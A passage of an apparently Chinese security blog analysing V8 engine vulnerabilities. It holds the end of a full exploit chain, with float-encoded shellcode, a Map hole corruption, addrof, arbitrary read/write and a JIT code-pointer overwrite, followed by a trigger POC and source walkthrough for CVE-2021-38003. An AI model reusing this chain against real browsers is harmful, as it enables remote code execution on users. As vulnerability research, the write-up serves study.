&#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="number">1.930800574428816e-246</span>,</span><br><span class="line">        <span class="number">1.9710610293119303e-246</span>,</span><br><span class="line">        <span class="number">1.9580046981136086e-246</span>,</span><br><span class="line">        <span class="number">1.9533830734556562e-246</span>,</span><br><span class="line">        <span class="number">1.961642575273437e-246</span>,</span><br><span class="line">        <span class="number">1.9399842868403466e-246</span>,</span><br><span class="line">        <span class="number">1.9627709291878714e-246</span>,</span><br><span class="line">        <span class="number">1.9711826272864685e-246</span>,</span><br><span class="line">        <span class="number">1.9954775598492772e-246</span>,</span><br><span class="line">        <span class="number">2.000505685241573e-246</span>,</span><br><span class="line">        <span class="number">1.9535148279508375e-246</span>,</span><br><span class="line">        <span class="number">1.9895153917617124e-246</span>,</span><br><span class="line">        <span class="number">1.9539853963090317e-246</span>,</span><br><span class="line">        <span class="number">1.9479373016495106e-246</span>,</span><br><span class="line">        <span class="number">1.97118242283721e-246</span>,</span><br><span class="line">        <span class="number">1.95323825426926e-246</span>,</span><br><span class="line">        <span class="number">1.99113905582155e-246</span>,</span><br><span class="line">        <span class="number">1.9940808572858186e-246</span>,</span><br><span class="line">        <span class="number">1.9537941682504095e-246</span>,</span><br><span class="line">        <span class="number">1.930800151635891e-246</span>,</span><br><span class="line">        <span class="number">1.932214185322047e-246</span></span><br><span class="line">    ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40000</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">shellcode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> map = <span class="keyword">new</span> <span class="title class_">Map</span>();</span><br><span class="line"><span class="keyword">let</span> hole = % <span class="title class_">TheHole</span>();</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">set</span>(hole, <span class="number">1</span>);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(hole);</span><br><span class="line">map.<span class="title function_">delete</span>(<span class="number">1</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(map.<span class="property">size</span>); <span class="comment">// -1</span></span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x15</span>, -<span class="number">1</span>);</span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">map.<span class="title function_">set</span>(<span class="number">0x303</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">2</span>]);</span><br><span class="line"><span class="keyword">var</span> double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">14</span>]);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &gt;&gt; <span class="number">32n</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">2</span>] = <span class="title function_">u2d</span>(double_array_map &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">22</span>] = <span class="title function_">u2d</span>(((offset - <span class="number">8n</span>) | <span class="number">1n</span>) | (<span class="title function_">d2u</span>(oob_array[<span class="number">22</span>]) &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> code_offset = <span class="title function_">read</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] code offset: &quot;</span> + <span class="title function_">hex</span>(code_offset));</span><br><span class="line"></span><br><span class="line">code_offset += <span class="number">0x68n</span>;</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(shellcode) + <span class="number">0x18n</span>, code_offset);</span><br><span class="line"></span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure></div> ## CVE-2021-38003 <a class="link" 
 href="https://gitcode.net/qq_45323960/attachment/-/tree/master/v8_pwn/CVE-2021-38003" >附件下载链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>
commit:<code>4a03d61accede9dd0e3e6dc0456ff5a0e3f792b4</code> 该漏洞是
<code>JSON.stringify()</code> 中存在触发溢出异常时没有设置
<code>pending_exception</code> 导致用户代码在 catch 异常时从
<code>pending_exception</code> 中取出默认填充值 <code>Hole</code> 。
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title class_">Isolate</span>::<span class="title function_">clear_pending_exception</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="title function_">DCHECK</span>(!thread_local_top_.<span class="property">pending_exception_</span>-&gt;<span class="title class_">IsException</span>(<span class="variable language_">this</span>));</span><br><span class="line">  thread_local_top_.<span class="property">pending_exception_</span> = <span class="title class_">ReadOnlyRoots</span>(<span class="variable language_">this</span>).<span class="title function_">the_hole_value</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div> <code>JSON.stringify()</code> 方法是将一个 JavaScript
对象或值转换为 JSON 字符串，如果指定了一个 replacer
函数，则可以选择性地替换值，或者指定的 replacer
是数组，则可选择性地仅包含数组指定的属性。</p>
<p>该函数定义为
<code>JSON.stringify(value[, replacer [, space]])</code></p>
<ul>
<li><p><code>value</code> 将要序列化成 一个 JSON 字符串的值。</p></li>
<li><p><code>replacer</code> （可选）
如果该参数是一个函数，则在序列化过程中，被序列化的值的每个属性都会经过该函数的转换和处理；如果该参数是一个数组，则只有包含在这个数组中的属性名才会被序列化到最终的
JSON 字符串中；如果该参数为 null
或者未提供，则对象所有的属性都会被序列化。</p></li>
<li><p><code>space</code> （可选）
指定缩进用的空白字符串，用于美化输出（pretty-print）；如果参数是个数字，它代表有多少的空格；上限为
10。该值若小于 1，则意味着没有空格；如果该参数为字符串（当字符串长度超过
10 个字母，取其前 10
个字母），该字符串将被作为空格；如果该参数没有提供（或者为
null），将没有空格。</p></li>
</ul>
<p>该函数返回值一个表示给定值的 JSON 字符串。</p>
<p>CVE-2021-38003 的 POC 如下，按照 POC 中调用
<code>JSON.stringify</code> 后的执行情况介绍 <code>JSON.stringify</code>
函数的具体流程。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">trigger</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> a = [], b = [];</span><br><span class="line">    <span class="keyword">let</span> s = <span class="string">&#x27;&quot;&#x27;</span>.<span class="title function_">repeat</span>(<span class="number">0x800000</span>);</span><br><span class="line">    a[<span class="number">20000</span>] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) a[i] = s;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) b[i] = a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(b);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (hole) &#123;</span><br><span class="line">        <span class="keyword">return</span> hole;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;could not trigger&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> hole = <span class="title function_">trigger</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(hole);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(hole);</span><br></pre></td></tr></table></figure></div>
<p><code>JSON.stringify()</code> 在 V8 中的接口如下：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">MaybeHandle&lt;Object&gt; <span class="title">JsonStringifier::Stringify</span><span class="params">(Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               Handle&lt;Object&gt; replacer,</span></span></span><br><span class="line"><span class="params"><span class="function">                                               Handle&lt;Object&gt; gap)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">InitializeReplacer</span>(replacer)) <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">  <span class="keyword">if</span> (!gap-&gt;<span class="built_in">IsUndefined</span>(isolate_) &amp;&amp; !<span class="built_in">InitializeGap</span>(gap)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">  &#125;</span><br><span class="line">  Result result = <span class="built_in">SerializeObject</span>(object);</span><br><span class="line">  <span class="keyword">if</span> (result == UNCHANGED) <span class="keyword">return</span> <span class="built_in">factory</span>()-&gt;<span class="built_in">undefined_value</span>();</span><br><span class="line">  <span class="keyword">if</span> (result == SUCCESS) <span class="keyword">return</span> builder_.<span class="built_in">Finish</span>();</span><br><span class="line">  <span class="built_in">DCHECK</span>(result == EXCEPTION);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">MaybeHandle</span>&lt;Object&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>可以看到 <code>Stringify</code> 在初始化完 <code>replacer</code> 和
<code>gap</code> 之后会调用核心函数 <code>SerializeObject</code>
之后对返回值进行检查，如果返回值为 <code>EXCEPTION</code>
说明触发异常。</p>
<p><code>SerializeObject</code> 函数实际是调用 <code>Serialize_</code>
函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Entry point to serialize the object.</span></span><br><span class="line"><span class="function">V8_INLINE Result <span class="title">SerializeObject</span><span class="params">(Handle&lt;Object&gt; obj)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Serialize_</span>&lt;<span class="literal">false</span>&gt;(obj, <span class="literal">false</span>, <span class="built_in">factory</span>()-&gt;<span class="built_in">empty_string</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>Serialize_</code> 函数中是一个很大的 switch ，对于
<code>obj</code> 中的元素的类型调用不同的序列化方法。根据 POC
的情况，这里调用 <code>SerializeJSArray</code> 函数。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="type">bool</span> deferred_string_key&gt;</span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::Serialize_</span><span class="params">(Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                    <span class="type">bool</span> comma,</span></span></span><br><span class="line"><span class="params"><span class="function">                                                    Handle&lt;Object&gt; key)</span> </span>&#123; </span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">switch</span> (HeapObject::<span class="built_in">cast</span>(*object).<span class="built_in">map</span>().<span class="built_in">instance_type</span>()) &#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">case</span> JS_ARRAY_TYPE:</span><br><span class="line">      <span class="keyword">if</span> (deferred_string_key) <span class="built_in">SerializeDeferredKey</span>(comma, key);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">SerializeJSArray</span>(Handle&lt;JSArray&gt;::<span class="built_in">cast</span>(object), key);</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p><code>SerializeJSArray</code> 函数的相关内容如下。在 POC 中数组
<code>b</code> 的每个元素均是数组 <code>a</code>，其类型是
<code>PACKED_ELEMENTS</code> 因此会调用 <code>SerializeElement</code>
处理，而 <code>SerializeElement</code> 会调用 <code>Serialize_</code>
递归进行处理。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">  <span class="comment">// Serialize an array element.</span></span><br><span class="line">  <span class="comment">// The index may serve as argument for the toJSON function.</span></span><br><span class="line">  <span class="function">V8_INLINE Result <span class="title">SerializeElement</span><span class="params">(Isolate* isolate, Handle&lt;Object&gt; object,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    <span class="type">int</span> i)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Serialize_</span>&lt;<span class="literal">false</span>&gt;(object, <span class="literal">false</span>,</span><br><span class="line">                             <span class="built_in">Handle</span>&lt;Object&gt;(Smi::<span class="built_in">FromInt</span>(i), isolate));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeJSArray</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSArray&gt; object, Handle&lt;Object&gt; key)</span> </span>&#123;</span><br><span class="line">  <span class="function">HandleScope <span class="title">handle_scope</span><span class="params">(isolate_)</span></span>;</span><br><span class="line">  Result stack_push = <span class="built_in">StackPush</span>(object, key);</span><br><span class="line">  <span class="keyword">if</span> (stack_push != SUCCESS) <span class="keyword">return</span> stack_push;</span><br><span class="line">  <span class="type">uint32_t</span> length = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">CHECK</span>(object-&gt;<span class="built_in">length</span>().<span class="built_in">ToArrayLength</span>(&amp;length));</span><br><span class="line">  <span class="built_in">DCHECK</span>(!object-&gt;<span class="built_in">IsAccessCheckNeeded</span>());</span><br><span class="line">  builder_.<span class="built_in">AppendCharacter</span>(<span class="string">&#x27;[&#x27;</span>);</span><br><span class="line">  <span class="built_in">Indent</span>();</span><br><span class="line">  <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (replacer_function_.<span class="built_in">is_null</span>()) &#123;</span><br><span class="line">    <span class="keyword">switch</span> (object-&gt;<span class="built_in">GetElementsKind</span>()) &#123;</span><br><span class="line">      ...</span><br><span class="line">      <span class="keyword">case</span> PACKED_ELEMENTS: &#123;</span><br><span class="line">        <span class="function">Handle&lt;Object&gt; <span class="title">old_length</span><span class="params">(object-&gt;length(), isolate_)</span></span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; length) &#123;</span><br><span class="line">          <span class="keyword">if</span> (object-&gt;<span class="built_in">length</span>() != *old_length ||</span><br><span class="line">              object-&gt;<span class="built_in">GetElementsKind</span>() != PACKED_ELEMENTS) &#123;</span><br><span class="line">            <span class="comment">// Fall back to slow path.</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">Separator</span>(i == <span class="number">0</span>);</span><br><span class="line">          Result result = <span class="built_in">SerializeElement</span>(</span><br><span class="line">              isolate_,</span><br><span class="line">              <span class="built_in">Handle</span>&lt;Object&gt;(FixedArray::<span class="built_in">cast</span>(object-&gt;<span class="built_in">elements</span>()).<span class="built_in">get</span>(i),</span><br><span class="line">                             isolate_),</span><br><span class="line">              i);</span><br><span class="line">          <span class="keyword">if</span> (result == UNCHANGED) &#123;</span><br><span class="line">            builder_.<span class="built_in">AppendCString</span>(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (result != SUCCESS) &#123;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">          &#125;</span><br><span class="line">          i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// The FAST_HOLEY_* cases could be handled in a faster way. They resemble</span></span><br><span class="line">      <span class="comment">// the non-holey cases except that a lookup is necessary for holes.</span></span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (i &lt; length) &#123;</span><br><span class="line">    <span class="comment">// Slow path for non-fast elements and fall-back in edge case.</span></span><br><span class="line">    Result result = <span class="built_in">SerializeArrayLikeSlow</span>(object, i, length);</span><br><span class="line">    <span class="keyword">if</span> (result != SUCCESS) <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">Unindent</span>();</span><br><span class="line">  <span class="keyword">if</span> (length &gt; <span class="number">0</span>) <span class="built_in">NewLine</span>();</span><br><span class="line">  builder_.<span class="built_in">AppendCharacter</span>(<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">  <span class="built_in">StackPop</span>();</span><br><span class="line">  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>数组 a 的成元是基本类型字符串，所以在 <code>SerializeJSArray</code>
方法不会再进入递归，而是调用 <code>SerializeArrayLikeSlow</code>
进行下一步操作</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">JsonStringifier::Result <span class="title">JsonStringifier::SerializeArrayLikeSlow</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    Handle&lt;JSReceiver&gt; object, <span class="type">uint32_t</span> start, <span class="type">uint32_t</span> length)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// We need to write out at least two characters per array element.</span></span><br><span class="line">  <span class="type">static</span> <span class="type">const</span> <span class="type">int</span> kMaxSerializableArrayLength = String::kMaxLength / <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">if</span> (length &gt; kMaxSerializableArrayLength) &#123;</span><br><span class="line">    isolate_-&gt;<span class="built_in">Throw</span>(*isolate_-&gt;<span class="built_in">factory</span>()-&gt;<span class="built_in">NewInvalidStringLengthError</span>());</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">uint32_t</span> i = start; i &lt; length; i++) &#123;</span><br><span class="line">    <span class="built_in">Separator</span>(i == <span class="number">0</span>);</span><br><span class="line">    Handle&lt;Object&gt; element;</span><br><span class="line">    <span class="built_in">ASSIGN_RETURN_ON_EXCEPTION_VALUE</span>(</span><br><span class="line">        isolate_, element, JSReceiver::<span class="built_in">GetElement</span>(isolate_, object, i),</span><br><span class="line">        EXCEPTION);</span><br><span class="line">    Result result = <span class="built_in">SerializeElement</span>(isolate_, element, i);</span><br><span class="line">    <span class="keyword">if</span> (result == SUCCESS) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> (result == UNCHANGED) &#123;</span><br><span class="line">      <span class="comment">// Detect overflow sooner for large sparse arrays.</span></span><br><span class="line">      <span class="keyword">if</span> (builder_.<span class="built_in">HasOverflowed</span>()) <span class="keyword">return</span> EXCEPTION;</span><br><span class="line">      builder_.<span class="built_in">AppendCString</span>(<span class="string">&quot;null&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>这里调用的 <code>SerializeElement</code> 会再次调用
<code>Serialize_</code> 只不过由于这次传入的是字符串，因此会调用
<code>SerializeString</code> 并最终调用
<code>SerializeString_</code>。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">JsonStringifier::SerializeString</span><span class="params">(Handle&lt;String&gt; object)</span> </span>&#123;</span><br><span class="line">  object = String::<span class="built_in">Flatten</span>(isolate_, object);</span><br><span class="line">  <span class="keyword">if</span> (builder_.<span class="built_in">CurrentEncoding</span>() == String::ONE_BYTE_ENCODING) &#123;</span><br><span class="line">    <span class="keyword">if</span> (String::<span class="built_in">IsOneByteRepresentationUnderneath</span>(*object)) &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;<span class="type">uint8_t</span>, <span class="type">uint8_t</span>&gt;(object);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      builder_.<span class="built_in">ChangeEncoding</span>();</span><br><span class="line">      <span class="built_in">SerializeString</span>(object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (String::<span class="built_in">IsOneByteRepresentationUnderneath</span>(*object)) &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;<span class="type">uint8_t</span>, base::uc16&gt;(object);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">SerializeString_</span>&lt;base::uc16, base::uc16&gt;(object);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">if</span> (object-&gt;<span class="built_in">IsString</span>()) &#123;</span><br><span class="line">        <span class="keyword">if</span> (deferred_string_key) <span class="built_in">SerializeDeferredKey</span>(comma, key);</span><br><span class="line">        <span class="built_in">SerializeString</span>(Handle&lt;String&gt;::<span class="built_in">cast</span>(object));</span><br><span class="line">        <span class="keyword">return</span> SUCCESS;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></div>
<p><code>SerializeString_</code> 本质就是把字符 <code>Append</code> 到
<code>builder_</code> 中。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> SrcChar, <span class="keyword">typename</span> DestChar&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">JsonStringifier::SerializeString_</span><span class="params">(Handle&lt;String&gt; string)</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; reader.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">      SrcChar c = reader.<span class="built_in">Get</span>&lt;SrcChar&gt;(i);</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">DoNotEscape</span>(c)) &#123;</span><br><span class="line">        builder_.<span class="built_in">Append</span>&lt;SrcChar, DestChar&gt;(c);</span><br><span class="line">      &#125; </span><br><span class="line">    ...</span><br><span class="line">  builder_.<span class="built_in">Append</span>&lt;<span class="type">uint8_t</span>, DestChar&gt;(<span class="string">&#x27;&quot;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>通过分析源码发现，整个序列化过程中一直利用 <code>builder_</code>
作为结果的存储容器，而这个容器最核心的功能就是 <code>Append</code>
。</p>
<p>在 <code>Append</code> 时如果长度达到 <code>part_length_</code>
则会调用 <code>Extend</code> 扩展容器长度。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> SrcChar, <span class="keyword">typename</span> DestChar&gt;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Append</span><span class="params">(SrcChar c)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(encoding_ == String::ONE_BYTE_ENCODING, <span class="built_in">sizeof</span>(DestChar) == <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">sizeof</span>(DestChar) == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(String::ONE_BYTE_ENCODING, encoding_);</span><br><span class="line">    SeqOneByteString::<span class="built_in">cast</span>(*current_part_)</span><br><span class="line">        .<span class="built_in">SeqOneByteStringSet</span>(current_index_++, c);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">DCHECK_EQ</span>(String::TWO_BYTE_ENCODING, encoding_);</span><br><span class="line">    SeqTwoByteString::<span class="built_in">cast</span>(*current_part_)</span><br><span class="line">        .<span class="built_in">SeqTwoByteStringSet</span>(current_index_++, c);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (current_index_ == part_length_) <span class="built_in">Extend</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而在 <code>Extend</code> 中会调用 <code>Accumulate</code>
检查扩展后的长度是否超过 <code>kMaxLength</code> 即 0x1fffffe8
，如果超过会设置 <code>overflowed_</code> 为 true 标记溢出。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Accumulate</span><span class="params">(Handle&lt;String&gt; new_part)</span> </span>&#123;</span><br><span class="line">  Handle&lt;String&gt; new_accumulator;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">accumulator</span>()-&gt;<span class="built_in">length</span>() + new_part-&gt;<span class="built_in">length</span>() &gt; String::kMaxLength) &#123;</span><br><span class="line">    <span class="comment">// Set the flag and carry on. Delay throwing the exception till the end.</span></span><br><span class="line">    new_accumulator = <span class="built_in">factory</span>()-&gt;<span class="built_in">empty_string</span>();</span><br><span class="line">    overflowed_ = <span class="literal">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    new_accumulator =</span><br><span class="line">        <span class="built_in">factory</span>()-&gt;<span class="built_in">NewConsString</span>(<span class="built_in">accumulator</span>(), new_part).<span class="built_in">ToHandleChecked</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">set_accumulator</span>(new_accumulator);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">IncrementalStringBuilder::Extend</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(current_index_, <span class="built_in">current_part</span>()-&gt;<span class="built_in">length</span>());</span><br><span class="line">  <span class="built_in">Accumulate</span>(<span class="built_in">current_part</span>());</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>而前面的 <code>SerializeArrayLikeSlow</code> 会根据
<code>overflowed_</code> 标记判断发生溢出并返回异常。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">V8_INLINE <span class="type">bool</span> <span class="title">HasOverflowed</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> overflowed_; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (builder_.<span class="built_in">HasOverflowed</span>()) <span class="keyword">return</span> EXCEPTION;</span><br></pre></td></tr></table></figure></div>
<p>然而根据前面的分析我们发现，只要结果不是 <code>SUCCESS</code>
基本都是直接返回的，没有设置 <code>pending_exception</code>
这一操作。</p>
<p>比如像 <code>SerializeArrayLikeSlow</code> 在出现异常时都会调用
